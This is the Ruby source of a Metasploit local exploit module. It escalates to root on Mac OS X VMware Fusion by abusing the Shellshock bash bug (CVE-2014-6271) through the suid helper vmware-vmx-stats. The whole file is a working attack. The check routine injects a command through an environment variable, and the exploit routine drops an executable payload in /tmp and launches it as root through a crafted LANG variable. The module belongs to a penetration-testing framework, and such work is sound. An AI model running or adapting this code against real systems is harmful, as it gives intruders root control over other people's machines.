##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Mac OS X VMWare Fusion Root Privilege Escalation Exploit',
      'Description'   => %q{
        This abuses the bug in bash environment variables (CVE-2014-6271) to get
        a suid binary inside of VMWare Fusion to launch our payload as root.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Stephane Chazelas', # discovered the bash bug
          'juken', # discovered the VMWare priv esc
          'joev', # msf module
          'mubix' # vmware-vmx-stats
        ],
      'References'    =>
        [
          [ 'CVE', '2014-6271' ]
        ],
      'Platform'      => 'osx',
      'Arch'          => [ ARCH_X86_64 ],
      'SessionTypes'  => [ 'shell', 'meterpreter' ],
      'Targets'       => [
        [ 'Mac OS X 10.9 Mavericks x64 (Native Payload)',
          {
            'Platform' => 'osx',
            'Arch' => ARCH_X86_64
          }
        ]
      ],
      'DefaultTarget' => 0,
      'DisclosureDate' => 'Sep 24 2014'
    ))

    register_options([
      OptString.new('VMWARE_PATH', [true, "The path to VMware.app", '/Applications/VMware Fusion.app']),
    ], self.class)
  end

  def check
    check_str = Rex::Text.rand_text_alphanumeric(5)
    # ensure they are vulnerable to bash env variable bug
    if cmd_exec("env x='() { :;}; echo #{check_str}' bash -c echo").include?(check_str) &&
       cmd_exec("file '#{datastore['VMWARE_PATH']}'") !~ /cannot open/

      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def exploit
    payload_file = "/tmp/#{Rex::Text::rand_text_alpha_lower(12)}"
    path = '/Contents/Library/vmware-vmx-stats' # path to the suid binary

    print_status("Writing payload file as '#{payload_file}'")
    exe = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
    write_file(payload_file, exe)
    register_file_for_cleanup(payload_file)
    cmd_exec("chmod +x #{payload_file}")

    print_status("Running VMWare services...")
    cmd_exec("LANG='() { :;}; #{payload_file}' '#{datastore['VMWARE_PATH']}#{path}' /dev/random")
  end

end
